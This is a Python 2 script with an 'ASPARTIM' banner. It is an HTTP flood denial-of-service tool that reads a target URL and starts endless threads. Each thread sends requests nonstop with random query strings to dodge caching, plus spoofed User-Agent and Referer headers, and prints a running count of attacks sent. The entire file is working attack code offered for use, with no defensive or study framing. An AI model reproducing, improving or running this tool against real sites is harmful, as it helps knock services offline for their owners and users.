import os
import sys
import urllib2
import threading
import random


########################################

"""
"""


if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")

print (" ")
print ("     _    ____  ____   _    ____ _____ ___ __  __ ")
print ("    / \  / ___||  _ \ / \  |  _ \_   _|_ _|  \/  |")
print ("   / _ \ \___ \| |_) / _ \ | |_) || |  | || |\/| |")
print ("  / ___ \ ___) |  __/ ___ \|  _ < | |  | || |  | |")
print (" /_/   \_\____/|_| /_/   \_\_| \_\|_| |___|_|  |_|")
print (" ")
print ("\033[1;32m")
url = raw_input("URL : ")
print ("\033[1;m")

count = 0
headers = []
referer = {
    "https://duckduckgo.com/",
    "https://www.google.com/",
    "https://www.youtube.com"
    "https://yandex.ru/",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u="
}


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")    
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")

    return headers


def ascii(size):
    out_str = ''

    for e in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)

    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                #print ("\033[1;32m Attacking Website \033[1;m")
                req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                #req = urllib2.Request(url)
                req.add_header("User-Agent", random.choice(useragent()))
                #req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
                req.add_header("Referer", referer)
                urllib2.urlopen(req)
                count += 1
                print ("{0} Pure Dos Send".format(count))
            except urllib2.HTTPError:
                print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
                pass
            except urllib2.URLError:
                print ("\033[1;34m URL ERROR \033[1;m")
                sys.exit()
            except ValueError:
                print ("\033[1;34m [-] Check You're URL \033[1;m")
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-] Canceled By User \033[1;m")
                sys.exit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("\033[1;34m [-] Canceled By User \033[1;m")
